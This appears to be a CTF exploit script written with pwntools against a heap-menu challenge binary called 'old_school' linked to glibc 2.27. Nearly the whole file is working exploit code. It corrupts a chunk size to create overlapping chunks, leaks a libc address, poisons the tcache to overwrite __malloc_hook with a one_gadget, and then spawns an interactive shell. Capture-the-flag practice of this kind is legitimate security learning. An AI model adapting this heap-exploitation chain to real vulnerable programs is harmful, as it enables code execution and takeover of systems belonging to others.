from pwn import *

libc = ELF('/home/wsxk/Desktop/ctf/libc-2.27.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget = [0x4f3d5,0x4f432,0x10a41c]
ld_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/ld-2.27.so"
#libc_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/libc-2.27.so"
libc_path = "/home/wsxk/Desktop/ctf/libc-2.27.so"
p = process([ld_path, "./old_school"], env={"LD_PRELOAD":libc_path})
#p=process("./old_school")
def alloc(index,size):
        p.recvuntil('Your choice: ')
        p.sendline('1')
        p.recvuntil('Index')
        p.sendline(str(index))
        p.recvuntil('Size: ')
        p.sendline(str(size))
def edit(index,content):
        p.recvuntil('Your choice: ')
        p.sendline('2')
        p.recvuntil('Index: ')
        p.sendline(str(index))
        p.recvuntil('Content: ')
        p.sendline(content)
def show(index):
        p.recvuntil('Your choice: ')
        p.sendline('3')
        p.recvuntil('Index: ')
        p.sendline(str(index))
        p.recvuntil('Content: ')
def free(index):
        p.recvuntil('Your choice: ')
        p.sendline('4')
        p.recvuntil('Index: ')
        p.sendline(str(index))
'''
alloc(10,0x88)
alloc(11,0x18)
alloc(12,0x88)
alloc(13,0x10)
alloc(14,0x88)
alloc(15,0x10)
for i in range(7):
        alloc(i,0xd8)
for i in range(7):
        free(i)
for i in range(7):
        alloc(i,0x88)
for i in range(7):
        free(i)

edit(11,p64(0)*3 + p8(0xe1))
free(12)
'''
alloc(10,0x88)
alloc(11,0x18)
alloc(12,0x88)
alloc(13,0x88)
edit(11,p64(0) * 3 + p8(0xb1))
free(12)
alloc(12,0xa8)
for i in range(7):
        alloc(i,0x88)
for i in range(7):
        free(i)
free(13)
edit(12,'a' * 0x90)
show(12)
p.recvuntil('a' * 0x90)
leak_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak_addr + 0x7f74e30b9000 - 0x00007f74e34a4c0a
realloc_hook = libc_base + libc.sym['realloc']
malloc_hook = libc_base + libc.sym['__malloc_hook']
print(hex(libc_base))
print(hex(malloc_hook))
edit(12,b'\x00' * 0x88 + p64(0x91))
for i in range(7):
        alloc(i,0x88)
edit(6,'aaaa')
free(13)
alloc(13,0x88)
free(13)
edit(12,b'\x00' * 0x88 + p64(0x91) + p64(malloc_hook  ))
alloc(14,0x88)
alloc(15,0x88)

edit(15,p64(one_gadget[2] + libc_base))#+ p64(realloc_hook + 2))
gdb.attach(p)
#pause()
alloc(16,0x10)
p.interactive()